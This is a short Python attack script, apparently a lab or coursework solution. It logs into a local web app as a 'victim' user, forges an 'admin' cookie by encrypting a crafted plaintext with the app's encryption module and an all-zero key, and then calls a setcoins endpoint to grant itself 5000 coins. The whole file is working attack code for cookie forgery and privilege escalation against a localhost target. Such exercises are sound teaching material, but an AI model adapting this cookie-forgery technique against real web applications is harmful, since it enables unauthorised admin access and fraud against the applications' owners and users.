from requests import codes, Session
import app

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here
	# print('@@', sess.cookies)

	#----------------
	encryption_key = b'\x00'*16
	cbc = app.api.encr_decr.Encryption(encryption_key)
	admin_cookie_pt = app.api.encr_decr.format_plaintext(int(True), pw)
	ctxt = cbc.encrypt(admin_cookie_pt)
	sess.cookies.set('admin', ctxt.hex(), domain='localhost.local', path='/')
	# print('@@', sess.cookies)

	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
